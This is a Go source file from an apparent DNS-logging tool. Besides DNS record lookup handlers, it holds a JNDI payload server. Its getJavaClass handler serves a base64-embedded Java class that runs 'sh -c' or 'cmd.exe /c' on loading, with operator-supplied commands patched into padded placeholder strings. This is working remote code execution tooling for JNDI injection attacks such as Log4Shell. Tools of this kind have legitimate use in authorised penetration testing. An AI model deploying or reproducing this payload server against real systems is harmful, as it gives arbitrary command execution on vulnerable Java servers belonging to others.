package api

import (
	"DnsLog/config"
	"DnsLog/protocol"
	"DnsLog/store"
	"DnsLog/utils"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/sirupsen/logrus"
	"io"
	"net/http"
	"strings"
)

type RespData struct {
	HTTPStatusCode int
	Msg            string
}

func index(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/template", http.StatusMovedPermanently)
}

func getRecords(w http.ResponseWriter, r *http.Request) {
	logrus.Infof("URL :%s", r.URL.String())
	key := r.URL.Query().Get("domain")
	res, has := store.GetData(key)
	if has {
		item, isOk := res.(protocol.DnsInfo)
		if !isOk {
			return
		}
		logrus.Infof("%v", item)
		data, _ := json.Marshal(item)
		fmt.Fprintf(w, string(data))
	} else {
		data, _ := json.Marshal([]string{})
		fmt.Fprintf(w, string(data))
	}

}

func register(w http.ResponseWriter, r *http.Request) {
	// get subdomain random id
	domain := utils.RandomString(6)
	fullDomain := domain + "." + config.OptionsConfig.Domain
	// 如果需要身份验证 这里绑定身份就可以了  、
	store.SetData(domain, domain)
	io.WriteString(w, fullDomain)

}

func PaddingChr(s string, c string, l int) string {
	// 字符串填充
	for i := len(s); i < l; i++ {
		s = s + c
	}
	return s
}

func registerJNDIClass(w http.ResponseWriter, r *http.Request) {
	// 注册一个jndi command
	key := utils.RandomString(6)
	r.ParseForm()
	winCmd := r.Form.Get("win_cmd")
	unixCmd := r.Form.Get("unix_cmd")
	if winCmd == "" && unixCmd == "" {
		return
	}
	store.SetData(key, []string{winCmd, unixCmd})
	io.WriteString(w, key)
}

func getJavaClass(w http.ResponseWriter, r *http.Request) {
	// 动他生成二进制文件对象
	// 获取二级路径作为KEY
	pat := strings.Split(r.URL.String(), "/")
	if len(pat) < 3 {
		return
	}
	key := pat[2]

	logrus.Infof("GET JAVA CLASS objects %s", key)
	data, has := store.GetData(key)

	if !has {
		logrus.Infof("key is not found:%s", key)
		return
	}
	p, ok := (data).([]string)
	if !ok {
		return
	}

	winCmd := PaddingChr(p[0], "0", 1024)
	unixCmd := PaddingChr(p[1], "0", 1024)
	w.Header().Add("Content-Type", "application/octet-stream")
	w.WriteHeader(200)
	// java8
	b := "yv66vgAAADQAZQoAHAArCAAsCQAbAC0IAC4JABsALwgAMAoADAAxCgAMADIKAAwAMwkANAA1CgA2ADcHADgKADQAOQgAOgoAOwA8CAA9CgAMAD4IAD8IAEAIAEEIAEIIAEMKAEQARQoARABGBwBHCgA2AEgHAEkHAEoBAAJXQwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAlVDAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAOAcASwcARwEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMACAAIQEEAHd3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3cMAB0AHgEEAHV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXUMAB8AHgEAAAwATABNDABOAE8MAFAAUQcAUgwAUwBUBwBVDABWAFcBABBqYXZhL2xhbmcvU3RyaW5nDABYAFkBAAdvcy5uYW1lBwBaDABbAFwBAAVMaW51eAwAXQBeAQAFbGludXgBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwBfDABgAGEMAGIAYwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAFYAZAEABE1haW4BABBqYXZhL2xhbmcvT2JqZWN0AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABmxlbmd0aAEAAygpSQEABmNoYXJBdAEABChJKUMBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANZ2V0UHJvcGVydGllcwEAGCgpTGphdmEvdXRpbC9Qcm9wZXJ0aWVzOwEAFGphdmEvdXRpbC9Qcm9wZXJ0aWVzAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGVxdWFsc0lnbm9yZUNhc2UBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAFShMamF2YS9sYW5nL09iamVjdDspVgAhABsAHAAAAAIACQAdAB4AAAAJAB8AHgAAAAIAAQAgACEAAQAiAAAAHQABAAEAAAAFKrcAAbEAAAABACMAAAAGAAEAAAABAAgAJAAhAAEAIgAAAYgAAwAFAAAAwRICswADEgSzAAUSBksSBkyyAAO2AAc9HJ4AI7IAAxwEZLYACBAwnwAPsgADAxy2AAlLpwAJhAL/p//fsgAFtgAHPRyeACOyAAUcBGS2AAgQMJ8AD7IABQMctgAJTKcACYQC/6f/37IACiq2AAsGvQAMTbgADRIOtgAPTi0SELYAEZkAHLIAChIStgALLAMSE1MsBBIUUywFK1OnABEsAxIVUywEEhZTLAUqU7gAFyy2ABhXpwANOgSyAAoZBLYAGrEAAQCrALMAtgAZAAIAIwAAAHoAHgAAAAIABQADAAoABgANAAcAEAAIABsACQApAAoAMgALADUACAA7AA4ARgAPAFQAEABdABEAYAAOAGYAFABtABUAcgAWAHsAFwCEABgAjAAZAJEAGgCWABsAnQAeAKIAHwCnACAAqwAjALMAJgC2ACQAuAAlAMAAJwAlAAAALQAK/gAXBwAmBwAmAR36AAX8AAYBHfoABf0ANgcAJwcAJg1KBwAo/wAJAAAAAAABACkAAAACACo="
	s, _ := base64.StdEncoding.DecodeString(b)
	winOld := ""
	unixOld := ""
	for i := 0; i < 1024; i++ {
		winOld += "w"
		unixOld += "u"
	}
	//unixCmd := "whoami"
	s = bytes.Replace(s, []byte(winOld), []byte(winCmd), 1)
	s = bytes.Replace(s, []byte(unixOld), []byte(unixCmd), 1)
	n, err := w.Write(s)
	if err != nil {
		fmt.Printf("n=%d err:%v\n", n, err)
	}
}
